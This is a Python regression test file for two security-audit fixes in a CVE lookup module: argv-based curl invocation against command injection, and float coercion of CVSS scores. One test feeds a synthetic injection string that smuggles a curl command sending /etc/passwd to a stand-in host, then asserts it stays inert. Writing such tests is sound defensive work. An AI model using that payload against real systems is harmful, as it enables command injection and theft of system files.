"""Regression tests for two cve.py audit fixes.

1. Command injection (CRITICAL): search_cves() built curl as a shell string with
   the keyword (derived from attacker-controlled Server/X-Powered-By headers)
   interpolated raw, and run_cmd ran it via shell=True. The fix passes curl as an
   argv list (shell=False) with a percent-encoded keyword, so shell metacharacters
   in a tech name are inert.

2. TypeError crash (HIGH): circl.lu may return cvss as a JSON string (e.g. "7.5").
   search_cves stored the raw value and the downstream high_cves filter compared
   it against a float, raising TypeError and discarding the whole CVE result set.
   The fix stores the float-parsed score and coerces defensively in the filter.

All data here is SYNTHETIC.
"""

import cve


def test_search_cves_uses_argv_list_not_shell_string(monkeypatch):
    """A malicious tech name must reach curl as a single argv element, never a
    shell string, so metacharacters cannot be reparsed by /bin/sh."""
    captured = []

    def fake_run_cmd(cmd, timeout=30):
        captured.append(cmd)
        return False, ""  # no network; force the empty/no-results path

    monkeypatch.setattr(cve, "run_cmd", fake_run_cmd)

    # Synthetic attacker-controlled tech token with shell metacharacters.
    malicious = 'nginx";curl evil.invalid -d@/etc/passwd;#'
    cve.search_cves(malicious)

    assert captured, "run_cmd was not invoked"
    for cmd in captured:
        # Must be an argv LIST (shell=False path), never a shell string.
        assert isinstance(cmd, list), f"curl built as shell string: {cmd!r}"
        # argv[0] is the binary; the metacharacters must not appear as a separate
        # executable token — they are percent-encoded inside the URL element.
        assert cmd[0] == "curl"
        joined = "".join(cmd)
        assert ";curl evil.invalid" not in joined
        assert '"' not in "".join(c for c in cmd if c.startswith("http"))


def test_search_cves_circl_string_cvss_is_float(monkeypatch):
    """circl.lu returning cvss as a string must be stored as a float so the
    downstream numeric filter cannot raise TypeError."""
    import json

    circl_payload = json.dumps([
        {"id": "CVE-2099-0001", "summary": "synthetic", "cvss": "7.5"},
        {"id": "CVE-2099-0002", "summary": "synthetic", "cvss": "4.2"},
    ])

    def fake_run_cmd(cmd, timeout=30):
        # NVD (method 1) returns nothing so the circl fallback is exercised.
        url = "".join(cmd) if isinstance(cmd, list) else cmd
        if "cve.circl.lu" in url:
            return True, circl_payload
        return True, "{}"

    monkeypatch.setattr(cve, "run_cmd", fake_run_cmd)

    results = cve.search_cves("acme-widget")
    assert results, "expected circl.lu fallback results"
    for c in results:
        assert isinstance(c["cvss_score"], float)

    # The high_cves filter shape must not raise on these stored values.
    high = [c for c in results if cve._coerce_cvss(c.get("cvss_score", 0)) >= 7.0]
    assert any(c["id"] == "CVE-2099-0001" for c in high)
    assert all(c["id"] != "CVE-2099-0002" for c in high)


def test_coerce_cvss_handles_str_none_and_bad():
    assert cve._coerce_cvss("7.5") == 7.5
    assert cve._coerce_cvss(None) == 0.0
    assert cve._coerce_cvss("") == 0.0
    assert cve._coerce_cvss("not-a-number") == 0.0
    assert cve._coerce_cvss(9) == 9.0


def test_run_cmd_list_uses_shell_false(monkeypatch):
    """run_cmd must run argv lists with shell=False and strings with shell=True."""
    calls = {}

    class FakeProc:
        returncode = 0

        def communicate(self, timeout=None):
            return ("out", "")

    def fake_popen(cmd, shell=False, **kwargs):
        calls["shell"] = shell
        return FakeProc()

    monkeypatch.setattr(cve.subprocess, "Popen", fake_popen)

    cve.run_cmd(["echo", "hi"])
    assert calls["shell"] is False

    cve.run_cmd("echo hi")
    assert calls["shell"] is True
